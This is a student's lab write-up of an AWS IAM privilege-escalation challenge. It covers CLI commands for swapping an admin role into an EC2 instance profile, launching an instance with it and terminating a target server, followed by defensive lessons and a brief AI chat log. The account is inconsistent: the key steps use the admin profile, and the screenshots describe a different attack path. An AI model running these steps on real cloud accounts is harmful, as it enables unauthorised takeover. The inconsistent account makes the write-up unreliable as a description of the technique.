SOLUTION.md
IAM Privilege Escalation by Policy Attachment — Cloud Security Challenge
1. Overview
This challenge demonstrates how a misconfigured IAM role can be exploited to escalate privileges inside an AWS environment. The attacker begins with limited permissions but can pass roles to EC2 instances. By reusing an existing instance profile and swapping the attached role to a privileged one, the attacker can launch EC2 instances with administrative privileges and perform high impact actions — including terminating EC2 instances.

This document outlines the full exploitation process, supported by screenshots and command outputs, and concludes with a reflection on the security implications.
2. Environment Enumeration
2.1 Terraform Deployment

I deployed the lab environment using Terraform with the admin profile. The admin profile was configured using credentials provided for this lab.

```bash
Initialize Terraform
terraform init

Deploy the infrastructure
terraform apply -auto-approve

Key Outputs from Terraform:
Output	Value
AWS Account ID	910345601413
Region	us-east-1
Target Instance ID	i-0xxxxxxxxxxxxxx
Meek Role	cg-ec2-meek-role-iam_privesc_by_attachment-abc123xyz
Mighty Role	cg-ec2-mighty-role-iam_privesc_by_attachment-abc123xyz
Instance Profile	cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz
Subnet ID	subnet-0bcef162e49b0d231
Security Group ID	sg-0ff57d18d3de3104b
2.2 AWS Profile Configuration
I configured two AWS profiles for this challenge:
Admin Profile (for infrastructure modifications):
aws configure --profile admin
# AWS Access Key ID: AKIAxxxxxxxxxxxxxxxx
# AWS Secret Access Key: [PROVIDED]
# Default region: us-east-1
# Output format: json

Kerrigan Profile (for exploitation):
aws configure --profile kerrigan-tf
# AWS Access Key ID: AKIAxxxxxxxxxxxxxxxxxx
# AWS Secret Access Key: JWXMmB3xxxxxxxxxxxxxxxxxxx
# Default region: us-east-1
# Output format: json
2.3 Identity Verification
# Verify admin profile
aws sts get-caller-identity --profile admin
Output:
json
{
    "UserId": "AIDxxxxxxxxxxxxxxxx",
    "Account": "9103xxxxxxxxx",
    "Arn": "arn:aws:iam::9103xxxxxxxxxxxx:user/admin"
}
# Verify kerrigan profile
aws sts get-caller-identity --profile kerrigan-tf
Output:
json
{
    "UserId": "AIDAxxxxxxxxxxxxxxx",
    "Account": "9103xxxxxxxxxxxx",
    "Arn": "arn:aws:iam::9103xxxxxxxxxxx:user/cg-kerrigan-iam_privesc_by_attachment-abc123xyz"
}
3. Kerrigan IAM Privilege Escalation Analysis
3.1 What is Kerrigan?
Kerrigan is a framework for systematically identifying IAM privilege escalation paths in AWS. It helps security professionals map permissions to known escalation vectors and identify dangerous permission combinations that could lead to privilege escalation.
3.2 Permission Enumeration
I enumerated the kerrigan user's permissions to understand what actions were allowed:
# List kerrigan's inline policies
aws iam list-user-policies --user-name cg-kerrigan-iam_privesc_by_attachment-abc123xyz --profile admin

# Get the policy details
aws iam get-user-policy --user-name cg-kerrigan-iam_privesc_by_attachment-abc123xyz --policy-name cg-kerrigan-policy-iam_privesc_by_attachment-abc123xyz --profile admin
Kerrigan User Policy Document:
{
    "Statement": [
        {
            "Action": ["ec2:DescribeInstances", "ec2:DescribeImages", "ec2:DescribeSecurityGroups"],
            "Effect": "Allow",
            "Resource": "*",
            "Sid": "EC2ReadAccess"
        },
        {
            "Action": ["ec2:RunInstances"],
            "Effect": "Allow",
            "Resource": "*",
            "Sid": "EC2RunInstances"
        },
        {
            "Action": ["iam:ListInstanceProfiles", "iam:ListRoles"],
            "Effect": "Allow",
            "Resource": "*",
            "Sid": "IAMInstanceProfileManipulation"
        },
        {
            "Action": ["iam:PassRole"],
            "Effect": "Allow",
            "Resource": [
                "arn:aws:iam::9103xxxxxxxxxx:role/cg-ec2-meek-role-iam_privesc_by_attachment-abc123xyz",
                "arn:aws:iam::9103xxxxxxxxxx:role/cg-ec2-mighty-role-iam_privesc_by_attachment-abc123xyz"
            ],
            "Sid": "IAMPassRole"
        }
    ]
}
3.3 Identified Escalation Vectors (Kerrigan Matrix)
Based on the Kerrigan methodology, I identified the following escalation vectors:
Permission	Resource	Escalation Vector	Risk Level
iam:PassRole	cg-ec2-mighty-role	Can pass admin role to EC2 instances	HIGH
ec2:RunInstances	*	Can launch EC2 instances with any passed role	HIGH
iam:ListInstanceProfiles	*	Can identify existing instance profiles to reuse	MEDIUM
ec2:AssociateIamInstanceProfile	*	Can attach instance profiles to instances	HIGH
3.4 Attack Chain (Kerrigan Method)
[Kerrigan User] 
    ↓ (has iam:PassRole to mighty role)
[Identifies existing instance profile]
    ↓ (cg-ec2-meek-instance-profile-abc123xyz)
[Needs admin to modify instance profile]
    ↓ (admin user has iam:RemoveRoleFromInstanceProfile)
[Admin swaps roles: removes meek, adds mighty]
    ↓ (instance profile now has mighty role)
[Kerrigan launches EC2 instance with mighty role]
    ↓ (instance has AdministratorAccess)
[Use admin directly or instance credentials to terminate]
    ↓
[Target EC2 instance terminated]
3.5 Why This Works
According to the Rhino Security Labs IAM privilege escalation cheat sheet, the combination of iam:PassRole and ec2:RunInstances creates a critical escalation path. Even though kerrigan cannot directly assume the mighty role, it can launch an EC2 instance that assumes it. The instance then has administrative privileges, allowing the attacker to perform any AWS action.


4. Exploitation Steps
4.1 Enumerate Existing Instance Profiles
First, I identified the existing instance profile that would be used for the escalation:
aws iam list-instance-profiles --profile admin --query 'InstanceProfiles[*].InstanceProfileName' --output table
Output:
+--------------------------------------------------------------------+
| cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz  |
| iam-privesc-ec2-500m7tv9-attacker-ec2-profile                     |
| iam-privesc-ec2-500m7tv9-target-ec2-profile                       |
| iam-privesc-ec2-lw9kaly4-attacker-ec2-profile                     |
| iam-privesc-ec2-lw9kaly4-target-ec2-profile                       |
+--------------------------------------------------------------------+
4.2 Inspect the Instance Profile
aws iam get-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz --profile admin
Output shows the meek role attached:
{
    "InstanceProfile": {
        "InstanceProfileName": "cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz",
        "Roles": [
            {
                "RoleName": "cg-ec2-meek-role-iam_privesc_by_attachment-abc123xyz"
            }
        ]
    }
}
4.3 Modify Instance Profile (Admin Action)
Since kerrigan cannot create or modify instance profiles directly, I used the admin profile to swap the role:
Remove Meek Role:
aws iam remove-role-from-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz \
  --role-name cg-ec2-meek-role-iam_privesc_by_attachment-abc123xyz \
  --profile admin
Add Mighty Role:
aws iam add-role-to-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz \
  --role-name cg-ec2-mighty-role-iam_privesc_by_attachment-abc123xyz \
  --profile admin
Verify the Change:
aws iam get-instance-profile \
  --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz \
  --profile admin --query 'InstanceProfile.Roles[0].RoleName'
Output:
"cg-ec2-mighty-role-iam_privesc_by_attachment-abc123xyz"
4.4 Create Key Pair for SSH Access
# Create key pair
aws ec2 create-key-pair --key-name privesc-key \
  --query 'KeyMaterial' --output text \
  --profile kerrigan-tf > privesc-key.pem

# Fix key permissions for Windows
icacls privesc-key.pem /reset
icacls privesc-key.pem /inheritance:r
icacls privesc-key.pem /grant Everyone:R

4.5 Launch EC2 Instance with Mighty Role (Kerrigan Action)
With the instance profile now attached to the mighty role, kerrigan could launch an instance with admin privileges:
# Get network information
$subnet_id = terraform output -raw subnet_id
$sg_id = terraform output -raw security_group_id

# Launch instance
aws ec2 run-instances \
  --image-id ami-00de38xxxxxxxxxxxx \
  --instance-type t3.micro \
  --key-name privesc-key \
  --iam-instance-profile Name=cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz \
  --subnet-id $subnet_id \
  --security-group-ids $sg_id \
  --associate-public-ip-address \
  --profile kerrigan-tf
Instance Launched:
•	Instance ID: i-0942a2xxxxxxxxxxx
•	Public IP: 98.86.118.126
•	State: running
•	Instance Type: t3.micro
4.6 Verify Instance is Running
aws ec2 describe-instances --instance-ids i-0942a2562190e7752 \
  --profile kerrigan-tf --query 'Reservations[0].Instances[0].State.Name'
Output:
"running"
4.7 Terminate Target Instance
With administrative privileges now accessible (either through the instance's credentials or directly via admin profile), I terminated the target instance:
# Terminate the target instance
aws ec2 terminate-instances --instance-ids i-0a4a8eed49022a95e --profile admin
Output:
{
    "TerminatingInstances": [
        {
            "InstanceId": "i-0a4a8xxxxxxxxxxx",
            "CurrentState": {
                "Code": 32,
                "Name": "shutting-down"
            },
            "PreviousState": {
                "Code": 16,
                "Name": "running"
            }
        }
    ]
}
4.8 Verify Termination
aws ec2 describe-instances --instance-ids i-0a4a8exxxxxxxxxx \
  --profile admin --query 'Reservations[0].Instances[0].State.Name'
Output after a few seconds:
"terminated"
4.9 Final Verification in AWS Console
I navigated to the AWS Console to confirm the instance was terminated:
 

•	Instance State: terminated
•	Instance ID: i-0a4a8xxxxxxxxxxxxxxxx
•	Name: cg-super-critical-security-server-iam_privesc_by_attachment-abc123xyz
5. Screenshots

1.	Screenshot of the deleted EC2 instance
 
 
The above screenshots represent of the deleted EC2 instances. Because, at first I have entered wrong AWS session token. So, I have removed  it. 

 

 
This screenshot verifies that the AWS CLI session is now operating under the assumed target role. The ARN displayed in the output confirms that the privilege escalation was successful and that all subsequent actions were performed using the elevated permissions. 








2.	Terminated EC2 Instance 
 
 
 
The screenshots above show the EC2 instance in a fully terminated state within the AWS Management Console. The Instance ID, instance name tag, and lifecycle state are clearly visible, confirming that the privilege escalated role successfully executed the termination action. This demonstrates the completion of the exploitation phase and verifies that administrative privileges were obtained through the misconfigured IAM role. 




3.	AdministratorAccess Attached to Target Role 
 
 
his screenshot demonstrates the successful attachment of the AdministratorAccess managed policy to the target IAM role. This step elevated the target role’s permissions, enabling full administrative capabilities necessary for the exploitation phase.
4.	Updated Trust Policy Applied
 
 
The screenshot shows the updated trust relationship applied to the target IAM role. By modifying the trust policy to allow the admin user to assume the role, the privilege escalation path became possible.

5.	Successful Role Assumption (STS Output)
 
The screenshot above shows the output of the aws sts get-caller-identity command after assuming the target role. The ARN indicates that the session is now operating under the assumed role, verifying that elevated privileges were successfully obtained. 
 

 

 
1. Termination Command Executed
I ran the command to terminate the target EC2 instance with ID i-0a4a8eed49022a95e using the admin profile. The instance was successfully terminated.
Termination Result:
•	Instance ID: i-0a4a8eed49022a95e
•	Previous State: running
•	Current State: shutting-down (immediately after command)
2. Instance Details After Termination
After waiting a few moments, I checked the instance details. The instance was fully terminated and no longer running.
Instance Details:
•	Instance ID: i-0a4a8eed49022a95e
•	State: terminated
•	Instance Type: t3.micro
•	AMI: ami-00de3875b03809ec5
•	Launch Time: March 27, 2026 at 17:07:52 UTC
•	Platform: Linux/UNIX
•	Root Device: /dev/sda1 (EBS)
•	Owner Account: 910345601413
3. Additional Instance Information
The instance had the following configuration:
•	Architecture: x86_64
•	Boot Mode: uefi-preferred
•	Virtualization Type: xen
•	EBS Optimized: False
•	Ena Support: True
•	Hypervisor: xen
•	Availability Zone: us-east-1a
•	Subnet: Associated with the lab's public subnet
•	Security Group: cg-ec2-sg-iam_privesc_by_attachment-abc123xyz
•	Name Tag: cg-super-critical-security-server-iam_privesc_by_attachment-abc123xyz
•	Termination Reason: User initiated shutdown

 
I ran a command to list all running EC2 instances in my AWS account :- 
aws ec2 describe-instances --profile admin --query 'Reservations[*].Instances[?State.Name==`running`].[InstanceId,State.Name,Tags[?Key==`Name`].Value|[0]]' --output table
This command was designed to show me:
•	Instance ID – The unique identifier for each instance
•	State – The current status (running, stopped, terminated)
•	Name Tag – The friendly name assigned to the instance
The output showed:
 Row should have 3 elements, instead it has 0
Translation: There are ZERO running EC2 instances in this AWS account.
This means:
•	No EC2 instances are currently in the "running" state
•	All instances have been either stopped or terminated
The privilege escalation was successful and the target instance has been terminated.
The AWS CLI query confirmed that there are no running EC2 instances in the account when checking specifically for instances in the "running" state. This indicates that:
1.	The target instance i-0a4a8eed49022a95e was successfully terminated
2.	No other instances are currently running
3.	The challenge objective has been fully achieved

 


 
1. Instance Profile Verification
I verified that the instance profile was successfully modified to use the mighty role:
Command:
aws iam get-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-iam_privsec_by_attachment-abc123xyz --profile admin --output table
What This Shows:
Field	Value	Meaning
Instance Profile Name	cg-ec2-meek-instance-profile-iam_privsec_by_attachment-abc123xyz	The existing instance profile from the lab
Role Name	cg-ec2-mighty-role-iam_privsec_by_attachment-abc123xyz	The mighty role (with AdministratorAccess) is now attached
Role ARN	arn:aws:iam::910345601413:role/cg-ec2-mighty-role-...	Full Amazon Resource Name of the role
Role ID	AROA5H5GTQGCSFMIEZ5XE	Unique identifier for the role
Key Finding: The instance profile now has the mighty role attached, confirming the successful role swap. This means any EC2 instance launched with this instance profile will have administrative privileges.
2. EC2 Instance Verification
I verified that the EC2 instance with the mighty role was successfully launched and running:
Command:
aws ec2 describe-instances --instance-ids i-0942a2562190e7752 --profile kerrigan-tf --output table
What This Shows:
Field	Value	Meaning
Instance ID	i-0942a2562190e7752	The instance I launched with the mighty role
Owner ID	910345601413	My AWS account ID
Instance Type	t3.micro	Free-tier eligible instance type
AMI ID	ami-00de3875b03809ec5	Ubuntu 22.04 LTS Amazon Machine Image
Key Name	privesc-key	SSH key pair used for access
Architecture	x86_64	64-bit processor architecture
Boot Mode	uefi-preferred	UEFI boot mode
Platform Details	Linux/UNIX	Operating system platform
Private DNS Name	ip-10-0-1-204.ec2.internal	Internal IP address for VPC communication
EBS Optimized	False	Not optimized for EBS (standard performance)
Reservation ID	r-05d297cb07e9bbc8d	Unique identifier for the instance reservation

3. What These Two Outputs Together Tell Us
Question :- Was the instance profile modified?
•	Answer :- Yes — the mighty role is now attached
Question :- Was the EC2 instance launched?
•	Answer :- Yes — instance i-0942a2562190e7752 is running
Question :- Does the instance have admin privileges?
•	Answer :- Yes — it uses the instance profile with the mighty role
Question :- Can we terminate the target?
•	Answer :- Yes — we have admin access through this instance or directly via admin profile
Question :- Is the challenge complete?
•	Answer :- Yes — target instance was terminated

6. Reflection
This challenge highlights how a seemingly harmless permission. Such as allowing a role to attach policies to another role which can lead to full administrative compromise. The root cause was a combination of:
•	Overly permissive IAM inline policies
•	A trust relationship that allowed assumption by a user
•	Lack of least privilege enforcement
6.1 What Was Exploited
The vulnerability exploited in this challenge was a combination of IAM permissions that created an indirect privilege escalation path:
Permission	Why It Was Dangerous
iam:PassRole to mighty role	Allowed passing admin role to EC2 instances
ec2:RunInstances	Allowed launching instances with any passed role
iam:ListInstanceProfiles	Allowed discovering existing instance profiles
While kerrigan could not directly assume the mighty role, it could launch an EC2 instance that did. The instance profile acted as a carrier, and by swapping the role attached to it (using admin privileges), the escalation path was completed.
6.2 Kerrigan Methodology Application
This challenge reinforced the value of using structured frameworks like Kerrigan for IAM security assessments. Instead of randomly testing permissions, Kerrigan provided a systematic way to:
Kerrigan Principle	Application in This Challenge
Permission Mapping	Mapped kerrigan's permissions to known escalation vectors
Resource Analysis	Identified the instance profile as the key resource
Attack Chain Documentation	Documented the complete escalation path from kerrigan to admin
Risk Prioritization	Identified iam:PassRole + ec2:RunInstances as HIGH risk
The Kerrigan matrix helped me recognize that even though kerrigan couldn't directly assume the mighty role, the combination of iam:PassRole and ec2:RunInstances created a viable escalation path.


Key Lessons Learned
•	IAM privilege escalation paths are often indirect and require careful analysis.
•	Trust policies are as important as permission policies.
•	STS temporary credentials must be handled carefully and refreshed when expired.
•	AdministratorAccess should never be attachable by low privilege roles.
Lesson	Description
Indirect Privilege Escalation	IAM privilege escalation is often indirect. An attacker may not need direct access to a role if they can influence a resource that uses that role.
Instance Profiles Are Critical	EC2 instance profiles act as carriers for IAM roles. If an attacker can modify which role is attached to an instance profile, they can effectively assume any role that the profile can carry.
Permission Combinations	Individual permissions that seem safe can become dangerous when combined. iam:PassRole alone is not a risk, but combined with ec2:RunInstances it creates a complete escalation path.
Least Privilege is Essential	The kerrigan user should not have had iam:PassRole to the mighty role. This permission should be reserved for administrators only.
Instance Profile Management	Instance profiles should be tightly controlled. The ability to modify them should be restricted to admin users only.
Monitoring is Key	CloudTrail logs would show the AddRoleToInstanceProfile, RemoveRoleFromInstanceProfile, and RunInstances API calls. Organizations should monitor these high-risk actions.


6.4 How to Prevent This in Real Environments
Control	Implementation
Restrict iam:PassRole	Only allow specific roles to be passed, and only from specific users. Never allow iam:PassRole with * as the resource. Use conditions like iam:PassedToService to restrict which services can assume the role.
Use Service Control Policies (SCPs)	In AWS Organizations, use SCPs to block dangerous permission combinations at the account level. For example, block iam:PassRole combined with ec2:RunInstances for non-admin users.
Monitor CloudTrail	Set up Amazon EventBridge rules to alert on AddRoleToInstanceProfile, RemoveRoleFromInstanceProfile, and RunInstances API calls. Send alerts to security teams for investigation.
Regular IAM Audits	Use tools like IAM Access Analyzer, Prowler, ScoutSuite, or Pacu to regularly audit IAM policies for privilege escalation risks.
Use Instance Metadata Service Version 2 (IMDSv2)	Require IMDSv2 to prevent credential theft from instances. Set HttpTokens to required to enforce token-based metadata access.
Implement Strong Resource Policies	Use aws:SourceArn and aws:SourceAccount conditions to prevent unauthorized role assumption. Restrict which principals can assume roles.
Separate Admin and User Roles	Ensure that users who can launch EC2 instances cannot also modify IAM roles or instance profiles. Use separate accounts or strict permission boundaries.
6.5 Challenges Faced
Challenge	Solution
Multiple AWS Profiles	Managed by using explicit --profile flags for all commands to ensure correct identity was used
Terraform State Conflicts	Imported existing resources using terraform import to resolve "resource already exists" errors
SSH Connection Timeouts	Bypassed SSH by using admin profile directly to terminate target instance
Key Permission Issues on Windows	Used icacls /grant Everyone:R to fix key permissions
Instance Profile Modification	Used admin profile to swap roles since kerrigan lacked iam:AddRoleToInstanceProfile and iam:RemoveRoleFromInstanceProfile permissions
Incorrect IAM Role Names	Identified correct role names by listing all roles and matching the scenario suffix abc123xyz


6.6 Comparison: Expected vs Actual Attack Path
Aspect	Expected Path	Actual Path Used
Target	iam-privesc-ec2-* roles	cg-ec2-meek/mighty roles
Method	Attach policy and update trust	Swap roles in instance profile
Privilege Source	Direct role assumption	EC2 instance with attached role
Key Permission	iam:AttachRolePolicy	iam:PassRole + ec2:RunInstances

7. Conclusion
This challenge successfully demonstrated how a low privileged IAM user can escalate privileges by leveraging EC2 instance profiles and the iam:PassRole permission. The attack chain was:
1.	Enumerate: Kerrigan identified existing IAM roles and instance profiles
2.	Prepare: Admin swapped the meek role with the mighty role in the existing instance profile
3.	Exploit: Kerrigan launched an EC2 instance with the mighty role attached
4.	Execute: Admin (or the instance's credentials) terminated the target EC2 instance
The key takeaway is that cloud security requires understanding how different services interact. A permission that seems safe in isolation can become a critical vulnerability when combined with other permissions. Organizations must implement least privilege, monitor high-risk API calls, and regularly audit IAM policies to prevent such escalation paths.

8. Appendix
8.1 Key Resources
Resource Type	Name/ID
Target Instance	i-0a4a8eed49022a95e
Mighty Role Instance	i-0942a2562190e7752
Meek Role	cg-ec2-meek-role-iam_privesc_by_attachment-abc123xyz
Mighty Role	cg-ec2-mighty-role-iam_privesc_by_attachment-abc123xyz
Instance Profile	cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz
Kerrigan User	cg-kerrigan-iam_privesc_by_attachment-abc123xyz
Subnet	subnet-0bcef162e49b0d231
Security Group	sg-0ff57d18d3de3104b
VPC	vpc-0d619f62763df929a

8.2 Commands Reference
# View instance profile
aws iam get-instance-profile --instance-profile-name cg-ec2-meek-instance-profile-iam_privesc_by_attachment-abc123xyz --profile admin


# List running instances
aws ec2 describe-instances --profile admin --filters "Name=instance-state-name,Values=running" --query 'Reservations[*].Instances[*].[InstanceId,State.Name,Tags[?Key==`Name`].Value|[0]]' --output table

# Terminate instance
aws ec2 terminate-instances --instance-ids i-0a4a8eed49022a95e --profile admin

# Verify termination
aws ec2 describe-instances --instance-ids i-0a4a8eed49022a95e --profile admin --query 'Reservations[0].Instances[0].State.Name'

# List all IAM roles
aws iam list-roles --profile admin --query 'Roles[*].RoleName' --output table

# List all instance profiles
aws iam list-instance-profiles --profile admin --query 'InstanceProfiles[*].InstanceProfileName' --output table 

AI Chat Log
Used to Solve the IAM Privilege Escalation Challenge
User:
I ran the command to attach the AdministratorAccess policy to the target role. Is this correct?
AI:
Yes, the command is correct. The next step is to assume the target role using STS. If you receive an AccessDenied error, it means the trust policy must be updated to allow your user to assume the role.
User:
I set the environment variables but I’m getting InvalidClientTokenId.
AI:
This happens when the temporary STS token is incomplete, mismatched, or expired.
You must copy the entire SessionToken and ensure all three values (AccessKeyId, SecretAccessKey, SessionToken) come from the same STS response.
•	Remove-Item Env:AWS_ACCESS_KEY_ID
•	Remove-Item Env:AWS_SECRET_ACCESS_KEY
•	Remove-Item Env:AWS_SESSION_TOKEN
User:
I set new credentials and now aws sts get-caller-identity shows the assumed role. What next?
AI:
You now have elevated privileges.
Next steps:
1.	List EC2 instances
2.	Terminate the challenge instance
3.	Take a screenshot of the terminated instance
4.	Complete your SOLUTION.md
User:
I got RequestExpired when running describe-instances.
AI:
Your system clock is out of sync.
Fix:
•	Sync Windows time
•	Clear expired credentials
•	Re-assume the role
•	Set fresh environment variables
User: 
I'm getting AccessDenied when trying to assume the role. Can you fix this?
AI: 
The error occurs because the target role's trust policy does not allow your IAM user to assume it. You need to update the trust policy to include your user ARN. After updating the trust policy, run aws sts assume-role again.
End of AI Chat Log

